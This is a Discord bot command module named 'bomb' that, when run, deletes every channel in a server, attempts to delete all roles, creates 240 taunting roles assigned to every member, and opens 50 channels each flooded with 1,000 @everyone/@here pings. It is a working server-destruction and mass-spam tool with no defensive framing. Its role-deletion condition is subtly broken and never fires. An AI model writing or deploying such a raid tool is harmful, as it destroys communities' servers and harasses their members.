module.exports.run = async (client, message, args) => {
    var channelNames = ["FelisDobra", "FelisDobra"]; // Spam channel names
    
    // 1. Delete ALL channels (with error handling)
    message.guild.channels.cache.forEach(channel => {
        channel.delete().catch(err => console.log(`Failed to delete channel ${channel.name}: ${err}`));
    });

    // 2. Delete ALL roles (except @everyone)
    message.guild.roles.cache.forEach(role => {
        if (!role.name === "everyone") {
            role.delete().catch(err => console.log(`Failed to delete role ${role.name}: ${err}`));
        }
    });

    // 3. Spam 240 new roles and assign them to everyone
    for (let i = 0; i < 240; i++) {
        message.guild.roles.create({ name: "FelisDobra UĞRADI DERSİNİZ KAWDEEŞŞ" })
            .then((createdRole) => {
                message.guild.members.cache.forEach(member => {
                    member.roles.add(createdRole.id).catch(err => console.log(`Failed to add role: ${err}`));
                });
            })
            .catch(err => console.log(`Failed to create role: ${err}`));
    }

    // 4. Create 50 spam channels and send 1,000 pings each
    for (let i = 0; i < 50; i++) {
        var channelName = channelNames[Math.floor(Math.random() * channelNames.length)];
        message.guild.channels.create(channelName, { type: "text" })
            .then(channel => {
                for (let i = 0; i < 1000; i++) {
                    channel.send(`FelisDobra Dersiniz, @everyone & @here`)
                        .catch(err => console.log(`Failed to send spam message: ${err}`));
                }
            })
            .catch(err => console.log(`Failed to create channel: ${err}`));
    }
}

module.exports.help = {
    name: "bomb"
}